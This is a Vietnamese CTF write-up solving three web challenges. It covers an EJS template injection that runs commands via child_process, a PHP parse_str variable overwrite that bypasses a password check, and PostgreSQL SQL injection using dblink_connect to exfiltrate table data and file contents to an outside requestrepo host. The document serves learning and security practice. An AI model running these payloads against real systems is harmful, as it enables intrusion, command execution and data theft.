# Web
## valentine (stolen)

<img src="https://github.com/caodchuong312/CTF-Writeups/assets/92881216/2e0c53dd-378e-449d-a45d-8caba7bcd3e0" width="400px" />
<br>
Description có gắn link writeup của bài gốc của chall này: <a href="https://maoutis.github.io/writeups/Web%20Hacking/valentine/" >đây</a>

Tóm lại là bài sẽ cho phép tạo 1 template và được truyền tham số `name` vào `{{ name }}`

![image](https://github.com/caodchuong312/CTF-Writeups/assets/92881216/142fc3b4-aca1-4443-b7cb-7819441b9680)
![image](https://github.com/caodchuong312/CTF-Writeups/assets/92881216/5c2c9de4-344d-4b88-a8ae-77f359536c17)
![image](https://github.com/caodchuong312/CTF-Writeups/assets/92881216/ca57ac60-6f6d-4b18-b694-18625fe832a4)

Vậy xác định được lỗi **SSTI**.

Tuy nhiên filter của bài này khác với bài viết gốc, cụ thể là:
```
let tmpl = req.body.tmpl;
let blacklist = ['<%', '%>', '[.', '.]', '(.', '.)', '{.', '.}', ',', '?', '!', '@', '#', '$', '%', '^', '&', '*', '-', '\\'] // safed keke
blacklist.forEach(e => {
    if (tmpl.includes(e)) {
        res.status(400).send({
            message: "don't hack me"
        })
    }
})
if (tmpl.includes('{{ name }}')) {
    tmpl = tmpl.replace(/\{\{/g, '<%=')
    tmpl = tmpl.replace(/\}\}/g, '%>')
} else {
    res.status(400).send({
        message: "{{ name }} required!"
    })
}
```
Về bài gốc: đọc qua source và writeup của bài gốc chúng ta có thể biết được cách bypass bài này bằng cách khai thác vào tính năng **custom delimiters** của EJS, đó là set các giá trị `delimiter`, `openDelimiter`, `closeDelimiter` qua URL để bypass. Tuy nhiên ở bài hiện tại dùng cách này còn gặp 1 lần filter nữa:
```
let parser = req._parsedUrl.query.split('&')
for (let e of parser) {
    if (e.startsWith('settings')) {
        res.status(400).send('Don\'t cheatt')
    }
}
if (!query['name']) {
    query['name'] = ''
}
return res.render(template, query);
});
```
Đến đây, em cũng như team đã tìm ra được bài <a href="https://hxp.io/blog/101/hxp-CTF-2022-valentine/" >writeup</a> khác. Qua đó tìm được payload:
```
<.- global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString() .>
```
Do bị filter `-` nên sửa lại đồng lại thêm `{{ name }}` được:
```
{{ global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString() }}{{ name }}
```
Đại khái thì đây là câu lệnh truy cập vào đối tượng `global.process.mainModule.constructor` (gồm những module hiện tại đang chạy) sau đó dùng `_load(`child_process`)` để lấy được module `child_process` rồi gọi với method `execSync()` để thực thi câu lệnh và dùng `toString` để trả về chuỗi.
Kết quả: 

<img src="https://github.com/caodchuong312/CTF-Writeups/assets/92881216/13257c97-1013-40b9-a626-7749e372a814" height="400px" />

<img src="https://github.com/caodchuong312/CTF-Writeups/assets/92881216/8acc0931-780f-4bb2-b4c8-10a154a069b9" height="400px" />


> Flag: `KCSC{https://www.youtube.com/watch?v=A5OLaBlQP9I}`

## Bypass Captcha

<img src="https://github.com/caodchuong312/CTF-Writeups/assets/92881216/d2b736cc-3278-4e3f-a5cd-fcfd9d09c6f1" width="400px" />

Bài cho source<br>
`index.php`:
```
<?php
include 'config.php';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $passwd = $_POST['passwd'];
    $response = $_POST['cf-turnstile-response'];
    if ($passwd === '' || $response === '') {
        die('Pls verify captcha or input password');
    }
    $ch = curl_init($SITE_VERIFY);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'secret' => $SECRET_KEY,
        'response' => $response
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($data);
    $now = time();
    $challenge_ts = strtotime($data->challenge_ts);
    if ($data->success == 1 && $now - $challenge_ts <= 5) {
        if ($passwd === $PASSWD) {
            die($FLAG);
        } else {
            die('Wrong password!');
        }
    } else {
        die('Verify captcha failed!');
    }
}
?>
```
File `config.php`:
```
<?php

$SITE_VERIFY = getenv('SITE_VERIFY');
$PASSWD = getenv('PASSWD');
$FLAG = getenv('FLAG');
$SITE_KEY = getenv('SITE_KEY');
$SECRET_KEY = getenv('SECRET_KEY');
parse_str($_SERVER['QUERY_STRING']);
error_reporting(0);
```

![image](https://github.com/caodchuong312/CTF-Writeups/assets/92881216/be0c60b1-4b47-44cc-acbe-1997e71258b7)


Phân tích: web sẽ lấy tham số `passwd` từ method POST gán vào biến `$passwd`, đoạn code tiếp theo thực hiện chức năng `curl` để tạo captcha. Flag sẽ được in ra trong đoạn code:
```
if ($data->success == 1 && $now - $challenge_ts <= 5) {
  if ($passwd === $PASSWD) {
    die($FLAG);
  } else {
    die('Wrong password!');
  }
} else {
  die('Verify captcha failed!');
}
```
Thỏa mãn 2 điều kiện: 
- `$data->success == 1 && $now - $challenge_ts <= 5`: captcha phải chính xác và thời gian sử dụng captcha bị là dưới `5s` sau khi verify.
- `$passwd === $PASSWD`: `$PASSWD` là biến môi trường mà ta không biết được.

Điểm chú ý ở đây là dòng code này trong file `config.php`:
```
parse_str($_SERVER['QUERY_STRING']);
```
`parse_str()` là hàm trong PHP sử dụng để parse dữ liệu trên URL (method GET) thành các biến hoặc mảng tương ứng. Một điều đặc biệt là biến sau khi được parse có thể ghi đè lên biến có sẵn và ý tưởng là biến `$PASSWD`. Vấn đề ở đây là là `$passwd` nhận từ method POST thì sao có truyền được `$PASSWD` qua method GET (URL) và đồng thời phải thực hiện nó trong vòng 5s. Sau 1 hồi khá là lâu, em tìm được cách là edit code HTML thêm `?PASSWD=1` sau `/index.php` rồi nhập vào ô input cũng là `1`:

![image](https://github.com/caodchuong312/CTF-Writeups/assets/92881216/f7f893c4-6850-4031-912f-eab327f44873)


Lúc giải thì trình duyệt không tự verify captcha nên thực hiện khá dễ dàng. Tuy nhiên về làm lại thì nó luôn tự verify điều này phải thực hiện bằng `Burp suite` :

Đầu tiên sử dụng `Intercept` để chặn lại sau đó refesh lại trang. Chọn `Do intercept` -> `Response to this request` -> `Forward` rồi chỉnh sửa rồi nhanh tay điền và submit form là được:

![image](https://github.com/caodchuong312/CTF-Writeups/assets/92881216/f5ed2a20-d911-4518-9c5a-e464d3029afd)

Kết quả :

![image](https://github.com/caodchuong312/CTF-Writeups/assets/92881216/4793a87e-40e8-4d68-9bfb-cec1fd824e8a)

> Flag: `KCSC{Bypass_Turnstile_Cloudflare_1e22c0f8}`

## Petshop

![image](https://github.com/caodchuong312/CTF-Writeups/assets/92881216/6f732919-d804-4c1a-9a00-88c85acc0a67)

Đầu tiên em tìm các entry point được `add-to-cart`, `thucung` tuy nhiên khi test qua thì không có hiện tượng gì, còn 1 cái nữa là `sp` bị `disable` phía client và đây là chỗ khả nghi và đúng vậy, nó trả lại lỗi khi nhập thử payload đơn giản:

![image](https://github.com/caodchuong312/CTF-Writeups/assets/92881216/5ba59c1d-699d-4c9b-b6b0-35befcde6724)

Kết hợp với phần mô tả nhắc đến **voi** dễ dàng đoán được đây thuộc lỗi **SQL injection** với DBMS là **PostgreSQL**

<img src="https://github.com/caodchuong312/CTF-Writeups/assets/92881216/33302535-d9d0-4dc4-ad72-3232b23fc229" height="300px" />
<img src="https://github.com/caodchuong312/CTF-Writeups/assets/92881216/750cd9ff-0021-42bd-81eb-dd83c0f6fdff" height="300px" />

Biết là vậy tuy nhiên trong thời gian diễn ra giải, em đã tìm kiếm và nhập thử nhiều payloads nhưng có vẻ không khả quan và bế tắc. 
Kết thúc giải, em có xem solution cũng như writeup của đội giải được và đó là `Out-of-band` (OOB).
<br>Nguồn tham khảo về OOB:
- https://omercitak.com/out-of-band-attacks-en/
- https://www.youtube.com/watch?v=8ItJbYrZOK8

Đầu tiên xác định số cột đề khai thác theo `Union`. Khi nhập payload `1'union select null,null;-- -` thì có lỗi `Có lỗi đã xảy ra vui lòng kiểm tra lại!!!!` trong khi thêm 1 null thì lại không có gì xảy ra => sử dụng union 2 cột. 

![image](https://github.com/caodchuong312/CTF-Writeups/assets/92881216/da21f71f-d103-4bf6-8263-f74f6f157952)

Như solution và cái video tham khảo phía trên, em tìm hiểu chút về `dblink_connect()`, theo doc:

<img src="https://github.com/caodchuong312/CTF-Writeups/assets/92881216/20f6a828-eb84-47e5-9a86-c80239fb3dfc" height=400px />


Tóm lại là nó dùng để kết nối để db khác, `'host='` là thông tin ip hoặc miền máy chủ nơi trigger được OOB, `user` và `password` dùng để đăng nhập vào db.
<br>Một điều em học được trong OOB khá hay qua bài này là việc truy xuất dữ liệu được nối với URL như subdomain mà không phải trả về qua body hay bất kỳ đâu. Và trang web có thể thực hiện điều đó là: <a href="https://requestrepo.com/" >requestrepo</a>.
<br>Bắt đầu khai thác tiếp: vào `requestrepo` lấy được URL: `9z897twe.requestrepo.com`.
Payload khi đó để truy xuất tên bảng: 
```
?sp=' union SELECT NULL, dblink_connect(CONCAT('host=',(SELECT tablename from pg_tables limit 1 offset 0) , '.9z897twe.requestrepo.com user=a password=a '))-- -
```
Sử dụng `limit 1 offset x` để truy xuất từng giá trị một.
Kết quả được : 

![image](https://github.com/caodchuong312/CTF-Writeups/assets/92881216/a345e79c-7745-4bf1-807a-2871b8f3f423)

Vậy có 1 bảng tên là `searches`. Tiếp tục thay đổi x để truy xuất ra tên bảng khác `pg_statistic`, `pg_type`,... Đây là bảng hệ thống của `PostgreSQL`, vậy ta chỉ cần quan tâm đến `searches`. <br>
Tiếp tục truy xuất tên cột bằng payload:
```
?sp=' union SELECT NULL, dblink_connect(CONCAT('host=',(SELECT column_name from information_schema.columns WHERE table_name='searches' limit 1 offset 0) , '.9z897twe.requestrepo.com user=a password=a '))-- -
```
Kết quả được 1 cột là `id`:

![image](https://github.com/caodchuong312/CTF-Writeups/assets/92881216/85c9a601-202b-44ae-ba8c-a88040ece584)

Tiếp tục với `limit offset 1` được thêm 1 cột là `search` và đó cũng là 2 cột duy nhất có trong bảng `searches`.<br>
Tiếp tục truy xuất ra dữ liệu của 2 cột, bắt đầu trước với `search`:
```
?sp=' union SELECT NULL, dblink_connect(CONCAT('host=',(SELECT search from searches limit 1 offset 0) , '.9z897twe.requestrepo.com user=a password=a '))-- -
```
Kết quả được `L3Zhci9saWIvcG9zdGdyZXNxbC9kYXRhL3NxbE91dE9mQmFuZA`

![image](https://github.com/caodchuong312/CTF-Writeups/assets/92881216/ca0fceb2-d904-4223-946e-f5a9c2f47754)

Thử deode nó bằng `Base64` được `/var/lib/postgresql/data/sqlOutOfBand`. Đây có lẽ là đường link chứa `flag`. Bây giờ đọc thử file đó bằng `pg_read_binary_file()` (nếu là file txt có thể dùng `pg_read_file()`). Payload:
```
' union SELECT NULL, dblink_connect(CONCAT('host=',(SELECT pg_read_binary_file ('/var/lib/postgresql/data/sqlOutOfBand')) , '.9z897twe.requestrepo.com user=a password=a '))-- -
```
Kết quả được `x4b4353437b596561685f42616e5f4c616d5f44756f635f526f692121217d0a`:

![image](https://github.com/caodchuong312/CTF-Writeups/assets/92881216/9eb858c8-3152-4e6e-a79a-e45d6a72e42d)

Có vẻ nó là hex và:

<img src="https://github.com/caodchuong312/CTF-Writeups/assets/92881216/2ca7034e-3b69-4b64-94e6-98a92fbaafe1" height=300px />

> Flag: `KCSC{Yeah_Ban_Lam_Duoc_Roi!!!}`


